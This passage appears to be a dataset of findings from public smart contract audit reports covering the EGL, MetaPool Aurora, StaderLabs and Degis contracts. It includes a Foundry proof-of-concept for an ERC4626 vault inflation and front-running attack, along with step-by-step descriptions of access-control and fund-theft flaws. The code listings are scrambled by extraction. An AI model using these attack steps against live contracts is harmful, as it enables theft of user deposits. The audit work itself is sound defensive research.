protection was added into the function. Listing 19: EglContract.sol (Lines 522) 509 function reVote ( uint _gasTarget , uint _eglAmount , uint8 _lockupDuration ) external whenNotPaused nonReentrant 510 function vote ( uint _gasTarget , uint _eglAmount , uint8 _lockupDuration ) external whenNotPaused nonReentrant 31 ", "labels": ["Halborn", "EGL_EglContract", "Severity: Informational"]}, {"title": "BLOCK TIMESTAMP ALIAS USAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "During a manual static review, the Halborn Team noticed the use of now. The global variable now is deprecated after the pragma version v0.7.0. Solidity Pragma Version 0.7.0 - Now Deprecated Code Location: Listing 20: EglContract.sol (Lines 763) 758 759 760 761 762 763 764 765 766 767 768 769 770 771 772 773 774 775 776 function addSeedAccount ( address _seedAccount , uint _seedAmount ) public onlyOwner { require ( _seedAmount <= remainingSeederBalance , \" EGL : INSUFFICIENT_SEED_BALANCE \" ); require ( seeders [ _seedAccount ] == 0, \" EGL : ALREADY_SEEDER \"); require ( voters [ _seedAccount ]. tokensLocked == 0 , \" EGL : ALREADY_HAS_VOTE \"); require ( eglToken . balanceOf ( _seedAccount ) == 0, \" EGL : ALREADY_HAS_EGLS \"); require ( now < firstEpochStartDate . add ( minLiquidityTokensLockup ) , \" EGL : SEED_PERIOD_PASSED \"); ( uint contributorAmount , , ,) = eglGenesis . contributors ( _seedAccount ); require ( contributorAmount == 0 , \" EGL : IS_CONTRIBUTOR \" ); remainingSeederBalance = remainingSeederBalance . sub ( _seedAmount ); remainingDaoBalance = remainingDaoBalance . sub ( _seedAmount ) ; seeders [ _seedAccount ] = _seedAmount ; emit SeedAccountAdded ( _seedAccount , _seedAmount , remainingSeederBalance , now ); } 32 Recommendation: Use block.number instead of block.timestamp or now reduce the influence of miners. If it is not possible to use block.number, now should replace with block.timestamp. Remediation Plan: NOT APPLICABLE: now was replaced by block.timestamp function. EGL Team considers safe the usage of block.timestamp because 900 seconds of drift from miners is preferable to other options. Calculating time from the block could be wrong if there is a fork or upgrade - timestamps are less vulnerable to a change in block duration that could occur with Ethereum 2.0 upgrades or hard forks. the use of oracles would create a dependency on the health of a third party service and potentially incur additional fees. 33 ", "labels": ["Halborn", "EGL_EglContract", "Severity: Informational"]}, {"title": "VAULT IMPLEMENTATION IS VULNERABLE TO INFLATION ATTACK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The StakedAuroraVault contract follows the EIP4626 standard: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/ contracts/token/ERC20/extensions/ERC4626.sol This extension allows the minting and burning of shares (represented using the ERC20 inheritance) in exchange for underlying assets through standardized deposit, mint, redeem and burn workflows. But this extension also has the following problem: When the vault is empty or nearly empty, deposits are at high risk of being stolen through front-running by inflating the share-token value through burning obtained shares. This is variously known as a donation or inflation attack and is essentially a problem of slippage. Therefore, this issue could affect the users using the protocol that run the risk of losing a part of their deposited tokens. Code Location: staking-pool-aurora: Listing 1: contracts/StakedAuroraVault.sol (Line 241) 240 function burn ( uint256 amount ) external { 241 242 } _burn ( msg . sender , amount ); 20 Listing 2: contracts/StakedAuroraVault.sol (Line 249) 247 function burnFrom ( address account , uint256 amount ) external { 248 249 250 } _spendAllowance ( account , msg . sender , amount ); _burn ( account , amount ); BVSS: AO:A/AC:L/AX:L/C:M/I:N/A:N/D:H/Y:N/R:N/S:U (8.8) Proof of Concept: In order to exploit the issue, an attacker just has to follow the next steps: 1. An attacker detects that a user is going to deposit and amount of tokens and front-runs the transaction by depositing an amount of tokens to burn its shares associated until keeping one, which will Burning these correspond to the entire balance of the contract. shares will inflate the value of share-token in the vault. For example, Alice wants to deposit 200 ETH, then the attacker front- run this transaction by depositing 100 ETH + 1 WEI to burn just after 100 shares. The attacker will end up having 1 share and the vault 100 ETH + 1 WEI. 2. Once the value of the share-token has been inflated, the victims transaction gets included in a block receiving many fewer shares due to the inflation. Following with the example, Alice finally deposits 200 ETH receiving only 1 share. 3. The attacker redeems the share, receiving part of the amount de- posited in the victims transaction that was front-run previously. In the example, the attacker will end up withdrawing 150 ETH, ob- taining 50 ETH of profit from previous Alices deposit and 100 ETH from the attackers deposit. The test described below and developed in Foundry shows balances and which 21 action has been performed in each step, proving a successful exploitation of this issue following the aforementioned steps: Listing 3: Inflation attack POC vm . prank ( OPERATOR ); stakedAuroraVault . updateEnforceWhitelist ( false ); aur . approve ( address ( stakedAuroraVault ) , 100 ether + 1) ; stakedAuroraVault . deposit (100 ether + 1, ATTACKER ); console . log ( \" [*] After ATTACKER 's deposit :\" ); printBalances () ; stakedAuroraVault . burn (100 ether ); // Inflate shares ' console . log ( \" [*] After ATTACKER 's inflation :\" ); printBalances () ; console . log (\" [ -] Initial balances :\" ); printBalances () ; prepareBalances () ; vm . startPrank ( ATTACKER ); { 1 function testInflationAttack () public { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  value 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  pending 38 vm . startPrank ( ATTACKER ); { vm . startPrank ( ALICE ); { } vm . stopPrank () ; } vm . stopPrank () ; console . log (\" [+] Victim deposit tokens : \"); printBalances () ; stakedAuroraVault . redeem (1 , ATTACKER , ATTACKER ); stakingManager . cleanOrdersQueue () ; // Set tokens as aur . approve ( address ( stakedAuroraVault ) , 200 ether ); stakedAuroraVault . deposit (200 ether , ALICE ); 22 stakingManager . cleanOrdersQueue () ; // Withdraw pending stakingManager . getAvailableAssets ( ATTACKER ) , ATTACKER , ATTACKER console . log (\" [*] After ATTACKER 's withdraw :\" ); printBalances () ; // AURORA 's tau ); skip (2 hours ); stakedAuroraVault . withdraw ( } vm . stopPrank () ; 39 40 41  tokens 42 43 44 45 46 47 48 49 50 51 52 } 53 54 function prepareBalances () public { 55 56 57 58 59 60 } 61 62 function printBalances () public view { 63  ATTACKER )); 64  balanceOf ( ATTACKER )); 65  totalSupply () ); 66 67  balanceOf ( ALICE )); 68 69 } aur . mint ( ALICE , 200 ether ); aur . mint ( BOB , 200 ether ); aur . mint ( CHARLIE , 200 ether ); aur . mint ( ATTACKER , 200 ether ); console . log (\" \" ); console . log (\" \\t - Attacker AUR balance : \" , aur . balanceOf ( console . log (\" \\t - Attacker stAUR balance : \" , stakedAuroraVault . console . log (\" \\t - stAUR total supply : \" , stakedAuroraVault . console . log (\" \\t - Alice AUR balance : \" , aur . balanceOf ( ALICE )) ; console . log (\" \\t - Alice stAUR balance : \" , stakedAuroraVault . 23 Files required to execute properly this test such as DeploymentHelper.sol have been included in the Appendix of this document. 24 Recommendation: It is recommended to not allow users to burn shares arbitrarily in order to avoid inflating them, this could be done by removing public burn functions or controlling their access. Also, vault deployers can protect against this attack by making an initial deposit of a non-trivial amount of the asset, such that price manipulation becomes infeasible. Remediation Plan: SOLVED: The MetaPool team solved the issue by removing public burn func- tions in the following commit ID:  e8dd85072bf7cd8a1c38a2d49068b42beee85d82. 25 ", "labels": ["Halborn", "MetaPool_Staking_Pools_Aurora", "Severity: High"]}, {"title": "ERC4626 VAULT DEPOSITS AND WITHDRAWS SHOULD CONSIDER SLIPPAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The scoped repositories make use of ERC4626 custom implementations that should follow the EIP-4626 definitions. This standard states the follow- ing security consideration: \"If implementors intend to support EOA account access directly, they should consider adding another function call for deposit/mint/withdraw /redeem with the means to accommodate slippage loss or unexpected deposit/withdrawal limits, since they have no other means to revert the transaction if the exact output amount is not achieved.\" These vault implementations do not implement a way to limit the slippage when deposits/withdraws are performed. This condition affects specially to EOA since they dont have a way to verify the amount of tokens received and revert the transaction in case they are too few compared to what was expected to be received. Applying this security consideration would help to EOA to avoid being front-run and losing tokens in transactions towards these smart contracts. Code Location: Listing 4: contracts/LiquidityPool.sol 166 function deposit ( 167 168 169 ) public override onlyFullyOperational returns ( uint256 ) uint256 _assets , address _receiver 26 Listing 5: contracts/LiquidityPool.sol 182 function redeem ( 183 184 185 186 ) public override onlyFullyOperational returns ( uint256 ) uint256 _shares , address _receiver , address _owner Listing 6: contracts/StakedAuroraVault.sol 178 function deposit ( 179 180 181 ) public override onlyFullyOperational checkWhitelist returns ( uint256 _assets , address _receiver  uint256 ) Listing 7: contracts/StakedAuroraVault.sol 190 function mint ( 191 192 193 ) public override onlyFullyOperational checkWhitelist returns ( uint256 _shares , address _receiver  uint256 ) Listing 8: contracts/StakedAuroraVault.sol 204 function withdraw ( 205 206 207 208 ) public override returns ( uint256 ) uint256 _assets , address _receiver , address Listing 9: contracts/StakedAuroraVault.sol 217 function redeem ( 218 219 220 221 ) public override onlyFullyOperational returns ( uint256 ) uint256 _shares , address _receiver , address _owner 27 BVSS: AO:A/AC:L/AX:M/C:N/I:N/A:N/D:M/Y:N/R:N/S:U (3.4) Recommendation: It is recommended to include slippage checks in the aforementioned func- tions to allow EOA to set the minimum amount of tokens that they expect to receive by executing these functions. References:  EIP-4626: Security Considerations Remediation Plan: SOLVED: The MetaPool team solved the issue by deploying new routers in order to handle EOA transactions and their respective slippage in the following commit ID:  9f2098d652f583b42eaa09cf5bd268bc4af46579. 28 ", "labels": ["Halborn", "MetaPool_Staking_Pools_Aurora", "Severity: Low"]}, {"title": "SAME DEPOSITOR CAN BE ADDED MULTIPLE TIMES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The StakingManager smart contract allows inserting multiple depositors that will be used to split the staking load into several smart contracts that should implement the IDepositors interface. The insertion process is made through the execution of insertDepositor function, where the depositors address will be stored in an array of depositors by executing the arrays native push function. However, since an array is being used instead of a mapping, a depositors address could be added to the array several times due this condition is not being checked before inserting a new depositor. This could cause a malfunction of the protocols logic. Code Location: Listing 10: contracts/StakingManager.sol 117 function insertDepositor ( 118 119 ) external onlyRole ( ADMIN_ROLE ) { 120 address _depositor require ( getDepositorsLength () < maxDepositors , \"  DEPOSITORS_LIMIT_REACHED \" ); depositors . push ( _depositor ); nextDepositor = _depositor ; _updateDepositorShares ( _depositor ); emit NewDepositorAdded ( _depositor , msg . sender ); 121 122 123 124 125 126 } BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:L/D:N/Y:N/R:P/S:U (2.8) 29 Recommendation: It is recommended to verify whether a depositors address has been stored previously in order to avoid major issues. Remediation Plan: SOLVED: The MetaPool team solved the issue by checking if the depositor already exists in the following commit ID:  5a2e083c72df10905d487fd235062435eba9702e. 30 ", "labels": ["Halborn", "MetaPool_Staking_Pools_Aurora", "Severity: Low"]}, {"title": "AN EXCESS OF DEPOSITORS COULD LEAD TO DOS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The StakingManager smart contract allows setting multiple depositors that will handle the interaction with Aurora external protocol to stake, enabling the possibility to have multiple instances where tokens will be staked during all this process. Depositors are controlled by using a dynamic array which stores a number of addresses limited by maxDepositors variable, and an operator can set depositors arbitrarily in this mapping as long as the length of depositors does not exceed maxDepositors value. However, many functions iterate over the aforementioned dynamic array in order to perform a search on it, thus in case of this mapping is large enough, a transaction could run out of gas by calling one of these functions. Code Location: Listing 11: contracts/StakingManager.sol (Line 222) 220 function depositorExists ( address _depositor ) external view returns  ( bool ) { 221 222 223 224 225 226 227 228 } uint256 _totalDepositors = getDepositorsLength () ; for ( uint i = 0; i < _totalDepositors ; i ++) { if ( depositors [ i] == _depositor ) { return true ; } } return false ; 31 Listing 12: contracts/StakingManager.sol (Line 240) 236 function setNextDepositor () external onlyStAurVault { 237 238 239 240 241 _updateDepositorShares ( nextDepositor ); address _nextDepositor = depositors [0]; uint256 _totalDepositors = getDepositorsLength () ; for ( uint i = 0; i < _totalDepositors ; i ++) { // Keeping a < instead of <= allows prioritizing the  deposits in lower index depositors . 242 if ( depositorShares [ depositors [ i ]] < depositorShares [  _nextDepositor ] ) { _nextDepositor = depositors [ i ]; } } nextDepositor = _nextDepositor ; 243 244 245 246 247 } BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:L/D:L/Y:L/R:P/S:U (2.2) Recommendation: It is recommended to be very restrictive regarding the limits of depositors array length and also, implementing a function to remove depositors from the array. Remediation Plan: SOLVED: The MetaPool team solved the issue by restricting the aforemen- tioned array length to 20. 32 ", "labels": ["Halborn", "MetaPool_Staking_Pools_Aurora", "Severity: Low"]}, {"title": "USAGE OF SEVERAL LOOPS IN UNSTAKING PROCESS COULD LEAD TO DOS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The cleanOrdersQueue function implemented in StakingManager smart con- tract allows processing all requested withdraws which have been put in queue between executions of this function. All these withdraw re- quests run through different states until withdraws are made effec- For instance, when an account wants to withdraw their staked tive. tokens a WithdrawOrder is created, after cleanOrdersQueue execution all WithdrawOrders are put into PendingOrders mapping and the protocol re- quests the withdrawal of these associated staked tokens to Aurora proto- col, in the next cleanOrdersQueue execution the order will be moved from PendingOrders into AvailableAssets mapping. At this point, the tokens could be withdrawn from the protocol. This function is executed every a constant defined by Aurora protocol plus a constant defined in StakingManager contract. Moreover, its operation is crucial for the correct functioning of the protocol. However, this function makes use of a huge amount of gas, since processing every state of each withdraw request requires to iterates over each request and each state independently by using several loops. Therefore, there is a possibility of running out of gas if there is a high volume of requests to process. Code Location: Listing 13: contracts/StakingManager.sol 351 for ( uint i = 0; i < _totalDepositors ; i ++) { address depositor = depositors [ i ]; 352 uint256 pendingAmount = IDepositor ( depositor ). getPendingAurora 353  () ; 33 354 355 356 357 } if ( pendingAmount > 0) { IDepositor ( depositor ). withdraw ( pendingAmount ); } Listing 14: contracts/StakingManager.sol 362 for ( uint i = 1; i <= _totalOrders ; i ++) { 363 364 365 366 } Order memory order = pendingOrder [i ]; pendingOrder [ i ] = Order (0 , address (0) ) ; availableAssets [ order . receiver ] += order . amount ; Listing 15: contracts/StakingManager.sol 377 for ( uint i = _totalDepositors ; i > 0; i - -) { 378 379 380 381 address depositor = depositors [i -1]; uint256 assets = getTotalAssetsFromDepositor ( depositor ); if ( assets == 0) continue ; uint256 nextWithdraw = _totalWithdrawInQueue - alreadyWithdraw  ; 382 383 384 385 386 387 388 389 390 391 392 } if ( assets >= nextWithdraw ) { IDepositor ( depositor ). unstake ( nextWithdraw ); alreadyWithdraw += nextWithdraw ; } else { IDepositor ( depositor ). unstakeAll () ; alreadyWithdraw += assets ; } _updateDepositorShares ( depositor ); if ( alreadyWithdraw == _totalWithdrawInQueue ) return ; Listing 16: contracts/StakingManager.sol 398 for ( uint i = 1; i <= _totalOrders ; i ++) { Order memory order = withdrawOrder [ i ]; 399 uint256 _assets = order . amount ; 400 401 if ( _assets > 0) { 402 403 404 address _receiver = order . receiver ; // Removing withdraw order . withdrawOrder [ i ] = Order (0 , address (0) ) ; 34 // Creating pending order . pendingOrder [i ] = Order ( _assets , _receiver ); 405 406 407 408 409 } } BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:L/D:L/Y:L/R:P/S:U (2.2) Recommendation: and WithdrawOrders arrays lengths. It is recommended to be very restrictive regarding the limits of depositors On the other hand, it could be convenient to split the load of the aforementioned function between different transactions to avoid running out of gas in a single transaction. Remediation Plan: SOLVED: The MetaPool team partially solved the issue by applying the restriction mentioned in HAL-05 and limiting WithdrawOrders length to 200. However, this maximum can be ignored since it can be arbitrarily set during the smart contract deployment. By the other hand, the workload of this function has not been split into minor tasks in order to reduce gas usage in a single transaction. 35 ", "labels": ["Halborn", "MetaPool_Staking_Pools_Aurora", "Severity: Low"]}, {"title": "VAULTS ARE NOT EIP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Following EIP-4626 definition, used ERC4626 custom implementations in scoped contracts are not fully EIP-4626 compliant due to the following functions are not meeting some EIPs requirements:  Withdraw function missing (LiquidityPool).  Mint function missing (LiquidityPool).  maxDeposit function:  MUST return the maximum amount of assets deposit would allow to be deposited for receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). This assumes that the user has infinite assets, i.e. MUST NOT rely on balanceOf of asset.  maxMint function:  MUST return the maximum amount of shares mint would allow to be deposited to the receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). This assumes that the user has infinite assets, i.e. MUST NOT rely on balanceOf of asset.  Deposit function ( LiquidityPool):  MUST emit the Deposit event.  Redeem function (LiquidityPool):  MUST emit the Withdraw event.  maxDeposit, maxMint, maxWithdraw and maxRedeem functions should re- turn 0 when their respective functions are disabled (LiquidityPool). 36 Code Location: Listing 17: contracts/LiquidityPool.sol 222 function mint ( uint256 , address ) public override pure returns (  uint256 ) { 223 224 } revert ( \" UNAVAILABLE_FUNCTION \"); Listing 18: contracts/LiquidityPool.sol 227 function withdraw ( uint256 , address , address ) public override pure  returns ( uint256 ) { 228 229 } revert ( \" UNAVAILABLE_FUNCTION \"); Listing 19: contracts/LiquidityPool.sol 210 emit RemoveLiquidity ( msg . sender , 211 _receiver , 212 _owner , 213 _shares , 214 auroraToSend , 215 216 stAurToSend 217 ); Listing 20: contracts/LiquidityPool.sol 320 emit AddLiquidity ( _caller , _receiver , _assets , _shares ); BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:N/R:P/S:U (2.5) Recommendation: All aforementioned functions should be modified to meet the EIP-4626 specifications in order to avoid future compatibility issues. 37 References:  EIP-4626: Specification Remediation Plan: PARTIALLY SOLVED: The MetaPool team partially solved the issue by sticking to EIP-4626 definitions. However, the staking-pool-aurora code has not been modified to stick to the following EIP-4626 definition:  maxDeposit, maxMint, maxWithdraw and maxRedeem functions should re- turn 0 when their respective functions are disabled (LiquidityPool). 38 ", "labels": ["Halborn", "MetaPool_Staking_Pools_Aurora", "Severity: Low"]}, {"title": "USE CUSTOM ERRORS INSTEAD OF REVERT STRINGS TO SAVE GAS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Failed operations in several contracts are reverted with an accompanying message selected from a set of hard-coded strings. In the EVM, emitting a hard-coded string in an error message costs ~50 more gas than emitting a custom error. Additionally, hard-coded strings increase the gas required to deploy the contract. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Custom errors are available from Solidity version 0.8.4 up. Consider replacing all revert strings with custom errors. Usage of custom errors should look like this: Listing 21 1 error CustomError () ; 2 3 // ... 4 5 if ( condition ) 6 revert CustomError () ; 39 Remediation Plan: SOLVED: The MetaPool team solved the issue by following the aforementioned recommendation. 40 ", "labels": ["Halborn", "MetaPool_Staking_Pools_Aurora", "Severity: Informational"]}, {"title": "USE UINT256 INSTEAD OF UINT IN FUNCTION ARGUMENTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In solidity, its well known that uint type is an alias of uint256 type which means that, at compilation time, declared uint variables are treated as uint256 variables, as well as function arguments. This condition is essential during ABI definition, since every argument whose type is uint will be assigned to uint256 type. Then, calling to this kind of function through its ABI definition should not be an issue, since uint will always be processed as uint256 in external contracts. However, using raw calls to contracts functions whose arguments contain an uint type could lead to errors and unexpected reverts if uint types are specified in the function signature of these raw calls due to function signatures using uint will mismatch with the actual signature that is using a uint256 type defined in the contract. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to change every uint type to uint256 in function arguments. Remediation Plan: SOLVED: The MetaPool team solved the issue by modifying the type to uint256. 41 ", "labels": ["Halborn", "MetaPool_Staking_Pools_Aurora", "Severity: Informational"]}, {"title": "LOOP GAS USAGE OPTIMIZATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Multiple gas cost optimization opportunities were identified in the loops of scoped contracts:  Unnecessary reading of the array length on each iteration wastes gas.  Using != consumes less gas.  It is possible to further optimize loops by using unchecked loop index incrementing and decrementing.  Pre-increment ++i consumes less gas than post-increment i++. Code Location: Listing 22: contracts/StakedAuroraVault.sol 144 for ( uint i = 0; i < _totalAccounts ; i ++) Listing 23: contracts/StakedAuroraVault.sol 159 for ( uint i = 0; i < _totalAccounts ; i ++) Listing 24: contracts/StakingManager.sol 159 for ( uint i = 1; i <= _totalOrders ; i ++) Listing 25: contracts/StakingManager.sol 170 for ( uint i = 1; i <= _totalOrders ; i ++) 42 Listing 26: contracts/StakingManager.sol 222 for ( uint i = 0; i < _totalDepositors ; i ++) Listing 27: contracts/StakingManager.sol 240 for ( uint i = 0; i < _totalDepositors ; i ++) Listing 28: contracts/StakingManager.sol 260 for ( uint i = 0; i < _totalDepositors ; i ++) Listing 29: contracts/StakingManager.sol 351 for ( uint i = 0; i < _totalDepositors ; i ++) Listing 30: contracts/StakingManager.sol 362 for ( uint i = 1; i <= _totalOrders ; i ++) Listing 31: contracts/StakingManager.sol 377 for ( uint i = _totalDepositors ; i > 0; i - -) Listing 32: contracts/StakingManager.sol 398 for ( uint i = 1; i <= _totalOrders ; i ++) BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to cache array lengths outside of loops, as long the size is not changed during the loop. 43 It is recommended to use the unchecked ++i operation to increment the values of the uint variable inside the loop. It is noted that using unchecked operations requires particular caution to avoid overflows, and their use may impair code readability. It is possible to save gas by using != inside loop conditions. Remediation Plan: SOLVED: The MetaPool team solved the issue by applying aforementioned recommendations. 44 4.10 (HAL-10) TYPOS IN COMMENTS - INFORMATIONAL (0.0) ", "labels": ["Halborn", "MetaPool_Staking_Pools_Aurora", "Severity: Informational"]}, {"title": "SOLC 0.8.2 COMPILER VERSION CONTAINS MULTIPLE BUGS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/StaderLabs_TokenERC20_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Solidity compiler version 0.8.3, 0.8.4 and 0.8.9 fixed important bugs in the compiler. The version 0.8.2 set in the hardhat.config.js file is missing all these fixes:  0.8.3  0.8.4  0.8.9 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use the most tested and stable versions, such as 0.6.12 or 0.7.6. Otherwise, if you still want to use ^0.8.0, because of the new functionality it provides, it is recommended to use 0.8.9 version. Remediation Plan: SOLVED: The StaderLabs team set the pragma to the 0.8.9 version. 12 MANUAL TESTING 13 Halborn performed several manual tests in the Stader.sol contract: G N I T S E T L A U N A M As the contract just follows the standard OpenZeppelin ERC20 contracts ERC20, ERC20Burnable, ERC20Permit and ERC20Votes, the manual tests were focused on testing the main functions of these contracts:  approve()  balanceOf()  burn() 14  burnFrom()  decreaseAllowance()  delegate()  increaseAllowance()  transfer()  transferFrom() The delegateBySig() function was also tested: And also the permit() function: No issues were found during the manual tests. G N I T S E T L A U N A M 15 ", "labels": ["Halborn", "StaderLabs_TokenERC20", "Severity: Informational"]}, {"title": "DEPOSITING TO ANY POOL/TOKEN WITH ANY AMOUNT VIA CONTROLLED POLICY CENTER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf", "body": "The function setter setPolicyCenter in charge of modifying the variable policyCenter, used to verify whether a functions caller is the policy center smart contract or not by checking the address stored in this variable, has no access control. Thus, any account can modify the address stored in policyCenter which is used to verify the caller in relevant functions such as depositFromPolicyCenter and withdrawFromPolicyCenter. This allows the depositFromPolicyCenter to be called without ever having to transfer tokens. This is causing an attacker to add pool liquidity to any desired pool ID with any chosen token and without any amount without ever owning a single token. This allows the attacker to gain full control on the balance of every single pool on the system. Code Location: Listing 1: src/reward/WeightedFarmingPool.sol (Line 75) 75 function setPolicyCenter ( address _policyCenter ) public { 76 77 } policyCenter = _policyCenter ; Listing 2: src/reward/WeightedFarmingPool.sol (Line 194) uint256 _id , address _token , uint256 _amount , address _user 194 function depositFromPolicyCenter ( 195 196 197 198 199 ) external { require ( 200 201 202 msg . sender == policyCenter , \" Only policyCenter can call stakedLiquidity \" 21 203 204 205 206 } ); _deposit ( _id , _token , _amount , _user ); Risk Level: Likelihood - 5 Impact - 5 Recommendation: This function should implement control access to prevent malicious mod- ifications on policyCenter variable. Remediation Plan: SOLVED: This issue was solved by implementing access control modifiers. 22 ", "labels": ["Halborn", "Degis_SCProtection", "Severity: Critical"]}, {"title": "INFINITE VOTING BY BYPASSING LOCKING AND RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf", "body": "The _claim function is not checking if the user has already claimed the funds for a settled proposal, which is causing an attacker to reclaim and unlock any locked veDEG not even for the proposal you are calling _claim for. So if the user/attacker is involved in voting for 2 proposals and one of them gets settled and claimed, the user/attack can unlock the locked veDEG for the other proposal by calling claim with the already claimed/settled proposal. This allows the attacker to vote again for the proposal since the funds are already unlocked, causing an infinite voting glitch. Code Location: Listing 3: src/voting/onboardProposal/OnboardProposal.sol (Line 386) revert OnboardProposal__WrongStatus () ; if ( proposal . status != SETTLED_STATUS ) UserVote storage userVote = votes [ _user ][ _id ]; 374 function _claim ( uint256 _id , address _user ) internal { 375 Proposal storage proposal = proposals [ _id ]; 376 377 378 379 380 381 382 383 384 385 386 387 388 389 } // Unlock the veDEG used for voting // No reward / punishment veDeg . unlockVeDEG ( _user , userVote . amount ); emit Claimed ( _id , _user , userVote . amount ); userVote . claimed = true ; 23 POC: 24 Risk Level: Likelihood - 5 Impact - 5 Recommendation: The code should be checking if the user has already claimed the funds by reverting if the userVote.claimed is set. Remediation Plan: SOLVED: This issue was fixed with the suggested recommendation. 25 ", "labels": ["Halborn", "Degis_SCProtection", "Severity: Critical"]}, {"title": "CODE NOT CHECKING IF TOKEN IS NOT PRESENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf", "body": "The _getIndex function under WeightedFarmingPool does not check if the token was not found and returns index 0 as default, causing not found tokens to be treated as part of the pool tokens. Code Location: Listing 4: src/reward/WeightedFarmingPool.sol (Lines 514,519) address [] memory allTokens = pools [ _id ]. tokens ; uint256 length = allTokens . length ; for ( uint256 i ; i < length ; ) { internal view returns ( uint256 index ) 511 function _getIndex ( uint256 _id , address _token ) 512 513 514 515 { 516 517 518 519 520 521 522 523 524 525 526 527 528 529 } if ( allTokens [ i ] == _token ) { unchecked { ++ i; index = i; break ; } else { } } } Risk Level: Likelihood - 5 Impact - 5 26 Recommendation: It is recommended to revert in case that the token is not found on the pool. Furthermore, another suggestion is to use a mapping between token addresses and pool ID, so the token is verified in O(1) and without any doubt. Remediation Plan: SOLVED: Instead of relying on arrays, a new mapping mapping(bytes32 => bool)public supported; was introduced to keep track of supported tokens for a given pool id. 27 ", "labels": ["Halborn", "Degis_SCProtection", "Severity: Critical"]}, {"title": "DEPOSITING ON ANY POOL USING ANY TOKEN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf", "body": "The deposit function under WeightedFarmingPool does accept any token as parameter. This token is then compared against all pool tokens and the index returned. However, since the _getIndex function does return 0 when a token is not found, the first token of the pool will be used and balance incremented. Furthermore, since the system does not implement any token white-listing a malicious token can be used so the transferFrom function does not perform any real transfer allowing to increment the stacked amount of the first pool token as wished. Code Location: Listing 5: src/reward/WeightedFarmingPool.sol (Line 280) pool . amount . push (0) ; user . amount . push (0) ; 280 uint256 index = _getIndex ( _id , _token ); 281 282 // check if current index exists for user 283 if ( user . amount . length < index + 1) { 284 285 } 286 if ( pool . amount . length < index + 1) { 287 288 } 289 290 user . amount [ index ] += _amount ; 291 user . share += _amount * pool . weight [ index ]; 292 293 pool . amount [ index ] += _amount ; 294 pool . shares += _amount * pool . weight [ index ]; 295 296 user . rewardDebt = ( user . share * pool . accRewardPerShare ) / SCALE ; 28 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to fix the _getIndex issue or provide the actual index of the token inside the pool instead of a user controlled token address. Remediation Plan: SOLVED: Instead of relying on arrays, a new mapping mapping(bytes32 => bool)public supported; was introduced to keep track of supported tokens for a given pool id. 29 ", "labels": ["Halborn", "Degis_SCProtection", "Severity: Critical"]}, {"title": "AN ATTACKER CAN WITHDRAW NOT OWNED TOKENS AND STEAL FUNDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf", "body": "The _withdraw function is using the invalid implemented _getIndex which is causing the transfer to take place into any user controlled token from the 